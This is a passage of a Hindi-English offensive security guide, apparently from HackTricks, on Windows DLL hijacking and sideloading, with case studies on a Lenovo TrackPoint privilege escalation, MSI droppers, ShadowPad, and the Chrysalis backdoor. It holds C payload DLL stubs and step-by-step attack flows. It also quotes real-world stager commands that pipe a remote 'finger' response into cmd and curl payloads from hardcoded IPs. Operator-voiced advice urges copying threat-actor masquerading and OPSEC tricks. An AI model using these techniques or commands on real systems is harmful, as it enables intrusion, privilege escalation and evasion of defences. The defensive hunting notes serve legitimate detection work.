- आप built-in Accessibility Tool (AT) registry entry (e.g., CursorIndicator) clone कर सकते हैं, उसे edit करके किसी arbitrary binary/DLL की ओर point कर सकते हैं, import कर सकते हैं, फिर `configuration` को उस AT name पर set कर सकते हैं। यह Accessibility framework के under arbitrary execution proxy करता है।

## Notes
- `%windir%\System32` के under write करना और HKLM values बदलना admin rights मांगता है।
- सभी payload logic `DLL_PROCESS_ATTACH` में रह सकता है; exports की जरूरत नहीं है।

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

यह case Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`) में **Phantom DLL Hijacking** दिखाता है, जिसे **CVE-2025-1729** के रूप में tracked किया गया है।

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` logged-on user के context में daily 9:30 AM पर चलता है।
- **Directory Permissions**: `CREATOR OWNER` द्वारा writable, जिससे local users arbitrary files drop कर सकते हैं।
- **DLL Search Behavior**: अपनी working directory से पहले `hostfxr.dll` load करने की कोशिश करता है और missing होने पर "NAME NOT FOUND" log करता है, जो local directory search precedence दिखाता है।

### Exploit Implementation

एक attacker same directory में malicious `hostfxr.dll` stub रख सकता है, missing DLL का exploit करके user's context के under code execution हासिल करने के लिए:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. एक standard user के रूप में, `hostfxr.dll` को `C:\ProgramData\Lenovo\TPQM\Assistant\` में drop करें।
2. Scheduled task के 9:30 AM पर current user's context में run होने का wait करें।
3. अगर task execute होते समय कोई administrator logged in है, तो malicious DLL administrator की session में medium integrity पर run होती है।
4. medium integrity से SYSTEM privileges तक elevate करने के लिए standard UAC bypass techniques chain करें।

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors अक्सर trusted, signed process के तहत payload execute करने के लिए MSI-based droppers को DLL side-loading के साथ pair करते हैं।

Chain overview
- User MSI download करता है। GUI install के दौरान एक CustomAction silently run होती है (e.g., LaunchApplication या VBScript action), embedded resources से next stage reconstruct करती है।
- Dropper एक legitimate, signed EXE और एक malicious DLL को same directory में write करता है (example pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll)।
- जब signed EXE start होता है, Windows DLL search order पहले working directory से wsc.dll load करता है, और signed parent (ATT&CK T1574.001) के under attacker code execute होता है।

MSI analysis (what to look for)
- CustomAction table:
- ऐसे entries देखें जो executables या VBScript run करते हैं। Example suspicious pattern: LaunchApplication जो background में embedded file execute करता है।
- Orca (Microsoft Orca.exe) में, CustomAction, InstallExecuteSequence और Binary tables inspect करें।
- MSI CAB में Embedded/split payloads:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- या lessmsi use करें: lessmsi x package.msi C:\out
- Multiple small fragments देखें जिन्हें VBScript CustomAction concatenate और decrypt करती है। Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- इन दोनों files को उसी folder में drop करें:
- wsc_proxy.exe: legitimate signed host (Avast). Process अपनी directory से name द्वारा wsc.dll load करने की कोशिश करता है.
- wsc.dll: attacker DLL. अगर specific exports की आवश्यकता नहीं है, तो DllMain पर्याप्त हो सकता है; otherwise, एक proxy DLL बनाएं और required exports को genuine library तक forward करें, जबकि payload को DllMain में run करें.
- एक minimal DLL payload build करें:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Export requirements के लिए, proxying framework (जैसे DLLirant/Spartacus) का उपयोग करें ताकि एक forwarding DLL बनाई जा सके जो साथ में आपका payload भी execute करे।

- यह technique host binary द्वारा DLL name resolution पर निर्भर करती है। यदि host absolute paths या safe loading flags (जैसे LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) उपयोग करता है, तो hijack fail हो सकता है।
- KnownDLLs, SxS, और forwarded exports precedence को प्रभावित कर सकते हैं और host binary तथा export set चुनते समय इन्हें ध्यान में रखना चाहिए।

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point ने बताया कि Ink Dragon legitimate software के साथ blend in करने के लिए **three-file triad** का उपयोग करके ShadowPad deploy करता है, जबकि core payload disk पर encrypted रहता है:

1. **Signed host EXE** – AMD, Realtek, या NVIDIA जैसे vendors का abuse किया जाता है (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`)। Attackers executable का नाम Windows binary जैसा दिखने के लिए बदल देते हैं (उदाहरण के लिए `conhost.exe`), लेकिन Authenticode signature valid रहती है।
2. **Malicious loader DLL** – EXE के साथ expected name (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`) से drop की जाती है। DLL आमतौर पर MFC binary होती है जिसे ScatterBrain framework से obfuscate किया गया होता है; इसका केवल काम encrypted blob को locate करना, उसे decrypt करना, और ShadowPad को reflectively map करना होता है।
3. **Encrypted payload blob** – अक्सर same directory में `<name>.tmp` के रूप में stored होता है। Decrypted payload को memory-mapping करने के बाद loader forensic evidence नष्ट करने के लिए TMP file delete कर देता है।

Tradecraft notes:

* Signed EXE का नाम बदलना (जबकि PE header में original `OriginalFileName` रखा जाता है) उसे Windows binary जैसा masquerade करने देता है, फिर भी vendor signature बनी रहती है, इसलिए Ink Dragon की आदत replicate करें कि `conhost.exe` जैसे दिखने वाले binaries drop करें जो असल में AMD/NVIDIA utilities हों।
* क्योंकि executable trusted रहता है, अधिकांश allowlisting controls को केवल आपकी malicious DLL को उसके साथ-साथ रहने की जरूरत होती है। Loader DLL को customize करने पर focus करें; signed parent आमतौर पर बिना छेड़छाड़ के चल सकता है।
* ShadowPad का decryptor अपेक्षा करता है कि TMP blob loader के पास हो और writable हो ताकि mapping के बाद वह file को zero कर सके। Payload load होने तक directory writable रखें; memory में आने के बाद TMP file को OPSEC के लिए safely delete किया जा सकता है।

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators DLL sideloading को LOLBAS के साथ pair करते हैं ताकि disk पर केवल custom artifact trusted EXE के साथ malicious DLL हो:

- **Remote command loader (Finger):** Hidden PowerShell `cmd.exe /c` spawn करता है, Finger server से commands खींचता है, और उन्हें `cmd` में pipe करता है:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` TCP/79 text खींचता है; `| cmd` server response execute करता है, जिससे operators second stage server-side rotate कर सकते हैं।

- **Built-in download/extract:** Benign extension के साथ archive download करें, उसे unpack करें, और sideload target plus DLL को random `%LocalAppData%` folder के नीचे stage करें:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` progress छुपाता है और redirects follow करता है; `tar -xf` Windows के built-in tar का उपयोग करता है।

- **WMI/CIM launch:** EXE को WMI के जरिए start करें ताकि telemetry में CIM-created process दिखे जबकि वह colocated DLL load करे:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- यह उन binaries के साथ काम करता है जो local DLLs prefer करते हैं (जैसे `intelbq.exe`, `nearby_share.exe`); payload (जैसे Remcos) trusted name के तहत चलता है।

- **Hunting:** `forfiles` पर alert करें जब `/p`, `/m`, और `/c` साथ में दिखें; admin scripts के बाहर यह uncommon है।


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

हाल की Lotus Blossom intrusion ने trusted update chain का abuse करके एक NSIS-packed dropper deliver किया, जिसने DLL sideload plus fully in-memory payloads stage किए।

Tradecraft flow
- `update.exe` (NSIS) `%AppData%\Bluetooth` बनाता है, उसे **HIDDEN** mark करता है, renamed Bitdefender Submission Wizard `BluetoothService.exe`, malicious `log.dll`, और encrypted blob `BluetoothService` drop करता है, फिर EXE launch करता है।
- Host EXE `log.dll` import करता है और `LogInit`/`LogWrite` call करता है। `LogInit` blob को mmap-load करता है; `LogWrite` इसे custom LCG-based stream (constants **0x19660D** / **0x3C6EF35F**, key material prior hash से derived) से decrypt करता है, buffer को plaintext shellcode से overwrite करता है, temps free करता है, और उसमें jump करता है।
- IAT से बचने के लिए, loader export names को **FNV-1a basis 0x811C9DC5 + prime 0x1000193** से hash करके APIs resolve करता है, फिर Murmur-style avalanche (**0x85EBCA6B**) लागू करता है और salted target hashes से compare करता है।

Main shellcode (Chrysalis)
- Key `gQ2JR&9;` के साथ पांच passes में add/XOR/sub repeat करके PE-like main module decrypt करता है, फिर import resolution finish करने के लिए dynamically `Kernel32.dll` → `GetProcAddress` load करता है।
- Per-character bit-rotate/XOR transforms के जरिए runtime पर DLL name strings reconstruct करता है, फिर `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32` load करता है।
- दूसरा resolver **PEB → InMemoryOrderModuleList** walk करता है, प्रत्येक export table को 4-byte blocks में Murmur-style mixing के साथ parse करता है, और hash न मिलने पर ही `GetProcAddress` पर fallback करता है।

Embedded configuration & C2
- Config dropped `BluetoothService` file के अंदर **offset 0x30808** (size **0x980**) पर रहती है और key `qwhvb^435h&*7` से RC4-decrypt होती है, जिससे C2 URL और User-Agent reveal होते हैं।
- Beacons dot-delimited host profile बनाते हैं, tag `4Q` prepend करते हैं, फिर HTTPS पर `HttpSendRequestA` से पहले key `vAuig34%^325hGV` के साथ RC4-encrypt करते हैं। Responses RC4-decrypt होकर tag switch द्वारा dispatch होते हैं (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases)।
- Execution mode CLI args से gated है: no args = install persistence (service/Run key) pointing to `-i`; `-i` self को `-k` के साथ relaunch करता है; `-k` install skip करता है और payload चलाता है।

Alternate loader observed
- उसी intrusion ने Tiny C Compiler भी drop किया और `C:\ProgramData\USOShared\` से `svchost.exe -nostdlib -run conf.c` execute किया, साथ में `libtcc.dll` मौजूद था। Attacker-supplied C source ने shellcode embed किया, compile किया, और disk पर PE touch किए बिना in-memory run किया। Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- इस TCC-based compile-and-run stage ने runtime पर `Wininet.dll` import किया और hardcoded URL से दूसरे-stage shellcode को pull किया, जिससे एक flexible loader मिला जो compiler run जैसा masquerade करता है।

## export proxying + host thread parking के साथ Signed-host sideloading

कुछ DLL sideloading chains **stability engineering** जोड़ते हैं ताकि legitimate host काफी देर तक alive रहे और malicious DLL load होने के बाद crash करने के बजाय बाद के stages साफ़-साफ़ load हों।

Observed pattern
- अपेक्षित dependency name जैसे `version.dll` का उपयोग करते हुए trusted EXE को malicious DLL के साथ drop करें।
- malicious DLL हर expected export को real system DLL (उदाहरण के लिए `%SystemRoot%\\System32\\version.dll`) की ओर **proxy** करती है ताकि import resolution सफल रहे और host process काम करता रहे।
- load होने के बाद, malicious DLL **host entry point को patch** करती है ताकि main thread exit होने या process terminate करने वाले code paths चलाने के बजाय infinite `Sleep` loop में चला जाए।
- एक नया thread असली malicious काम करता है: next-stage DLL name या path को decrypt करना (RC4/XOR आम हैं), फिर उसे `LoadLibrary` के साथ launch करना।

Why this matters
- Normal DLL proxying API compatibility बनाए रखता है, लेकिन यह guarantee नहीं करता कि host बाद के stages के लिए पर्याप्त देर तक alive रहेगा।
- main thread को `Sleep(INFINITE)` में park करना signed process को resident रखने का आसान तरीका है, जबकि loader worker thread में decryption, staging, या network bootstrap करता है।
- केवल suspicious `DllMain` पर hunting करने से यह pattern miss हो सकता है, अगर interesting behavior host entry point patch होने और secondary thread शुरू होने के बाद होता है।

Minimal workflow
1. signed host EXE को copy करें और पता लगाएँ कि वह local directory से किस DLL को resolve करता है।
2. वही functions export करने वाली proxy DLL बनाएँ और उन्हें legitimate DLL की ओर forward करें।
3. `DllMain(DLL_PROCESS_ATTACH)` में एक worker thread create करें।
4. उस thread से host entry point या main thread start routine को patch करें ताकि वह `Sleep` पर loop करे।
5. next-stage DLL name/config को decrypt करें और `LoadLibrary` call करें या payload को manual-map करें।

Defensive pivots
- Signed processes जो `version.dll` या इसी तरह की common libraries को `System32` के बजाय अपनी application directory से load करते हैं।
- image load के तुरंत बाद process entry point पर memory patches, खासकर जब jumps/calls को `Sleep`/`SleepEx` की ओर redirect किया गया हो।
- proxy DLL द्वारा बनाए गए threads जो तुरंत decrypted name वाली दूसरी DLL पर `LoadLibrary` call करते हैं।
- vendor executables के साथ writable staging directories जैसे `ProgramData`, `%TEMP%`, या unpacked archive paths में रखी गई full-export proxy DLLs।

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [Unit 42 – CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)


{{#include ../../../banners/hacktricks-training.md}}
